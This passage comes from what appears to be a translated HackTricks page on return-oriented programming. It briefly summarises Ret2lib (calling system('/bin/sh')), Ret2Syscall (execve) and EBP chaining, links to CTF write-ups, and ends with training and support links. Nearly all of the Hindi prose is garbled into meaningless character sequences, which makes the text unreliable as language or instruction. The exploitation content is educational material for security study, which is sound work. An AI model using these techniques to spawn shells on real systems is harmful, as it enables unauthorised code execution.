* **Ret2lib**: рдордирдорд╛рдиреЗ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде рд▓реЛрдб рдХреА рдЧрдИ рд▓рд╛рдЗрдмреНрд░реЗрд░реА рд╕реЗ рдордирдорд╛рдиреЗ рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЖрдорддреМрд░ рдкрд░ рдХреБрдЫ рдРрд╕рд╛ рдЬреИрд╕реЗ `system('/bin/sh')`ред

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ syscall, рдЬреИрд╕реЗ `execve`, рдХреЗ рд▓рд┐рдП рдХреЙрд▓ рддреИрдпрд╛рд░ рдХрд░реЗрдВ, рдФрд░ рдЗрд╕реЗ рдордирдорд╛рдиреЗ рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдПрдВред

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret рдФрд░ EBP рдЪреЗрдирд┐рдВрдЧ**: рдкрд╣рд▓рд╛ EIP рдХреЗ рдмрдЬрд╛рдп EBP рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рдкреНрд░рд╡рд╛рд╣ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдФрд░ рджреВрд╕рд░рд╛ Ret2lib рдХреЗ рд╕рдорд╛рди рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдкреНрд░рд╡рд╛рд╣ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ EBP рдкрддреЗ рдХреЗ рд╕рд╛рде рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реЛрддрд╛ рд╣реИ (рд╣рд╛рд▓рд╛рдВрдХрд┐ EIP рдХреЛ рднреА рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ)ред

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 рдмрд┐рдЯ, рдкрд╛рдИ рдФрд░ рдПрдирдПрдХреНрд╕ рд╕рдХреНрд╖рдо, рдХреЛрдИ рдХреИрдирд░реА рдирд╣реАрдВ, рдПрдХ `vsyscall` рдкрддреЗ рдХреЗ рд╕рд╛рде RIP рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░реЗрдВ рдЬрд┐рд╕рдХрд╛ рдПрдХрдорд╛рддреНрд░ рдЙрджреНрджреЗрд╢реНрдп рд╕реНрдЯреИрдХ рдореЗрдВ рдЕрдЧрд▓реЗ рдкрддреЗ рдкрд░ рд▓реМрдЯрдирд╛ рд╣реИ рдЬреЛ рдлреНрд▓реИрдЧ рд▓реАрдХ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдп рдХреЗ рднрд╛рдЧ рдХрд╛ рдЖрдВрд╢рд┐рдХ рдУрд╡рд░рд░рд╛рдЗрдЯ рд╣реЛрдЧрд╛
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, рдХреЛрдИ ASLR рдирд╣реАрдВ, рд╕реНрдЯреИрдХ рдореЗрдВ рд╢реЗрд▓рдХреЛрдб рдкрд░ рдХреВрджрдиреЗ рдФрд░ рд╕реНрдЯреИрдХ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП ROP рдЧреИрдЬреЗрдЯ

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
